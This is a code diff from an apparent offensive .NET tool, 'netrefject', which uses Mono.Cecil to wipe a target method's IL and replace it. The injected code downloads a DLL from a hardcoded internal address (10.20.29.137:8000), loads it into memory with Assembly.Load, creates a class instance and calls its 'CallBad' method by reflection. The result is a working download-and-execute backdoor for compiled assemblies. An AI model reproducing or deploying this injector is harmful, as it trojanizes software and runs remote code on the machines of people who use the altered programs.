@@ -384,14 +384,6 @@ namespace netrefject
 
         private void injectShell(MethodDefinition m1){
             ILProcessor ilp = m1.Body.GetILProcessor();
-            //int instructionCounter = 0;
-            //ilp.InsertBefore (m1.Body.Instructions [instructionCounter], ilp.Create (OpCodes.Ldstr, "INJECTED EVIL"));
-            //ilp.InsertAfter (m1.Body.Instructions [instructionCounter], ilp.Create (OpCodes.Call,m1.Module.Import (typeof (Console).GetMethod ("WriteLine", new [] { typeof (string) }))));
-            //instructionCounter++;
-
-            //We're adding code to the end of the method 
-            //We could add to the beginning as well, but for now blah
-            
             //Remove All code and variables
             m1.Body.Instructions.Clear();
             m1.Body.Variables.Clear();
@@ -426,85 +418,107 @@ namespace netrefject
 
             m1.Body.InitLocals = true;
             m1.Body.Variables.Add(new VariableDefinition(refs.uint8));
+            //Remote Class Instance Variable
+            m1.Body.Variables.Add(new VariableDefinition(refs.var));
+            //Remote class Type Variable 
+            m1.Body.Variables.Add(new VariableDefinition(m1.Module.ImportReference(typeof(Type))));
             m1.Body.Variables.Add(new VariableDefinition(refs.var));
 
+            var evilRemoteBytesVar = m1.Body.Variables.ElementAt(0);
+            var instantiatedEvilTypeVar = m1.Body.Variables.ElementAt(1);
+            var typeVariable = m1.Body.Variables.ElementAt(2);
+            var someResultObjectVar = m1.Body.Variables.ElementAt(3);
 
-            /* Insert Variables
-            m1.Body.Variables.Insert(0, new VariableDefinition(refs.uint8));
-            m1.Body.Variables.Insert(1, new VariableDefinition(refs.Assembly));
-            m1.Body.Variables.Insert(2, new VariableDefinition(refs.MethodInfo));
-            m1.Body.Variables.Insert(3, new VariableDefinition(refs.var));
-            m1.Body.Variables.Insert(4, new VariableDefinition(refs.boolean));
-            m1.Body.Variables.Insert(5, new VariableDefinition(refs.var_array));
-            m1.Body.Variables.Insert(6, new VariableDefinition(refs.int32));
-            m1.Body.Variables.Insert(7, new VariableDefinition(refs.boolean));
+            ilp.Append(Instruction.Create(OpCodes.Nop));
+            ilp.Append(Instruction.Create(OpCodes.Nop));
 
-            var Var_4 = m1.Body.Variables.ElementAt(4);
-            var Var_5 = m1.Body.Variables.ElementAt(5);
-            var Var_6 = m1.Body.Variables.ElementAt(6);
-            var Var_7 = m1.Body.Variables.ElementAt(7);
-
-            // Instructions
-            Instruction NOP_0x48 = Instruction.Create(OpCodes.Nop);
-            Instruction NOP_0x88 = Instruction.Create(OpCodes.Nop);
-            Instruction NOP_0x5D = Instruction.Create(OpCodes.Nop);
-            Instruction POP_0x8B = Instruction.Create(OpCodes.Pop);
-            Instruction LDLOC_0x6B = Instruction.Create(OpCodes.Ldloc_S, Var_6);
-            Instruction RET_0x90 = Instruction.Create(OpCodes.Ret);*/
+            Instruction RETI = Instruction.Create(OpCodes.Ret);
+            Instruction POPI = Instruction.Create(OpCodes.Pop);
+            Instruction NOPI = Instruction.Create(OpCodes.Nop);
 
             ilp.Append(Instruction.Create(OpCodes.Nop));
 
-            /*
-            ExceptionHandler handler = new ExceptionHandler(ExceptionHandlerType.Catch)
-            {
-                TryStart = m1.Body.Instructions.ElementAt(1),
-                TryEnd = POP_0x8B,
-                HandlerStart = POP_0x8B,
-                HandlerEnd = RET_0x90,
-                CatchType = refs.Exception
-            };
-
-            m1.Body.ExceptionHandlers.Add(handler);
-            */                
-            // Try
-            //AssemblyDefinition ad = m1.Module.AssemblyResolver.Resolve(new AssemblyNameReference("System.Net.WebClient",new Version(2,0)));
-            //m1.Module.AssemblyReferences.Add(new AssemblyNameReference("System.Net",new Version(2,0)));
-            //m1.Module.AssemblyReferences.Add(new AssemblyNameReference("System.Net.WebClient",new Version(2,0)));
-
-            ilp.Append(Instruction.Create(OpCodes.Nop));
             ilp.Append(ilp.Create (OpCodes.Ldstr, "INJECTED EVIL"));
             ilp.Append(ilp.Create (OpCodes.Call, m1.Module.ImportReference (typeof (Console).GetMethod ("WriteLine", new [] { typeof (string) }))));
+            //Download DLL
             ilp.Append(Instruction.Create(OpCodes.Nop));
             ilp.Append(Instruction.Create(OpCodes.Newobj, m1.Module.ImportReference(typeof(WebClient).GetConstructor(new Type[] { }))));
-            //ilp.Append(Instruction.Create(OpCodes.Stloc_1));
-            //ilp.Append(Instruction.Create(OpCodes.Ldloc_1));
-
             ilp.Append(Instruction.Create(OpCodes.Ldstr, "http://10.20.29.137:8000/HELLOWORLD"));
             ilp.Append(Instruction.Create(OpCodes.Callvirt, m1.Module.ImportReference(typeof(WebClient).GetMethod("DownloadData", new Type[] { typeof(string) }))));
             ilp.Append(Instruction.Create(OpCodes.Stloc_0));
-            //Breaks from here down
+
+            //Load into memory
             ilp.Append(Instruction.Create(OpCodes.Ldloc_0));
             ilp.Append(Instruction.Create(OpCodes.Call, refs.Assembly_Load));
+
+            //Create instance of class
             ilp.Append(Instruction.Create(OpCodes.Ldstr, "testlibrary.Testclass"));
             ilp.Append(Instruction.Create(OpCodes.Callvirt, m1.Module.ImportReference(typeof(Assembly).GetMethod("CreateInstance", new Type[] { typeof(string) }))));
-            ilp.Append(Instruction.Create(OpCodes.Stloc_1));
+            ilp.Append(Instruction.Create(OpCodes.Stloc_S,instantiatedEvilTypeVar));
+            //ilp.Append(Instruction.Create(OpCodes.Stloc_1));
+
+            //Load type of class in order to call method
+            ilp.Append(Instruction.Create(OpCodes.Ldloc_1));
+            ilp.Append(Instruction.Create(OpCodes.Callvirt, m1.Module.ImportReference (typeof (object).GetMethod ("GetType", new Type[] {}))));
+            //Type is now on stack...
+            
+            //Might not have to store the object, but fuckit store it
+            //ilp.Append(Instruction.Create(OpCodes.Stloc_2));
+            //Works until above            
+            //Load object instance
+            //ilp.Append(ilp.Create(OpCodes.Ldloc_2));
+
+            //Call method in class with Type.Invoke
+            ilp.Append(ilp.Create(OpCodes.Ldstr,"CallBad"));
+            ilp.Append(ilp.Create(OpCodes.Ldc_I4,0x100));
+            ilp.Append(ilp.Create(OpCodes.Ldnull));
+            ilp.Append(ilp.Create(OpCodes.Ldloc_1));
+            ilp.Append(ilp.Create(OpCodes.Ldnull));
+            //instance.GetType().InvokeMember("FlapMethod",BindingFlags.InvokeMethod,null,instance,null);
+            ilp.Append(ilp.Create(OpCodes.Callvirt,
+                m1.Module.ImportReference(
+                    typeof(Type).GetMethod("InvokeMember", 
+                        new Type[] { 
+                            typeof(string), 
+                            typeof(BindingFlags),
+                            typeof(Binder),
+                            typeof(object),
+                            typeof(object[])
+                        })
+                    )
+                )
+            );
+
+            //ilp.Append(ilp.Create(OpCodes.Stloc_3));
+            m1.Body.Instructions.Add(Instruction.Create(OpCodes.Pop));
+            m1.Body.Instructions.Add(Instruction.Create(OpCodes.Nop));
+
+            //uncommentilp.Append(Instruction.Create(OpCodes.Ldloc_S, instantiatedEvilTypeVar));            
+            //Check for null
+            //ilp.Append(Instruction.Create(OpCodes.Ldnull));
+            //ilp.Append(Instruction.Create(OpCodes.Ceq));
+
+
+            //ilp.Append(Instruction.Create(OpCodes.Callvirt, m1.Module.ImportReference (typeof (object).GetMethod ("GetType", new Type[] {}))));
 
             ilp.Append(ilp.Create (OpCodes.Ldstr, "Wattefok dit werk nou bra"));
             ilp.Append(ilp.Create (OpCodes.Call, m1.Module.ImportReference (typeof (Console).GetMethod ("WriteLine", new [] { typeof (string) }))));
 
-            ilp.Append(Instruction.Create(OpCodes.Nop));
             
-
-            //ilp.Append(Instruction.Create(OpCodes.Newobj, m1.Module.ImportReference(typeof(WebClient).GetConstructor(new Type[] { }))));
-            //ilp.Append(Instruction.Create(OpCodes.Ldstr, "http://[IP]]/HELLOWORLD")); // URL_OF_EXE
-            /*ilp.Append(Instruction.Create(OpCodes.Call, refs.WebClient_DownloadData));
-            ilp.Append(Instruction.Create(OpCodes.Stloc_0));
-            ilp.Append(Instruction.Create(OpCodes.Ldloc_0));
-            ilp.Append(Instruction.Create(OpCodes.Nop));*/
+            ilp.Append(Instruction.Create(OpCodes.Nop));
+            //Works until above
+            //ilp.Append(Instruction.Create(OpCodes.Ldloc_1,instantiatedEvilType));
+            //ilp.Append(Instruction.Create(OpCodes.Callvirt, m1.Module.ImportReference (typeof (object).GetMethod ("GetType", new Type[] {}))));            
+            
+            //ilp.Append(ilp.Create(OpCodes.Ldstr,"TestMethod"));
+            //ilp.Append(ilp.Create(OpCodes.Ldc_I4,0x100));
+            //ilp.Append(ilp.Create(OpCodes.Ldnull));
+            //ilp.Append(ilp.Create(OpCodes.Ldloc_1));
+            //ilp.Append(ilp.Create(OpCodes.Ldnull));
+            //ilp.Append(ilp.Create(OpCodes.Callvirt,m1.Module.ImportReference(typeof(MethodBase).GetMethod("Invoke", new Type[] { typeof(object), typeof(object[]) }))));
 
             //Add our new ret
-            ilp.Append(ilp.Create(OpCodes.Ret));     
-
+            ilp.Append(RETI);
             return;
 
 
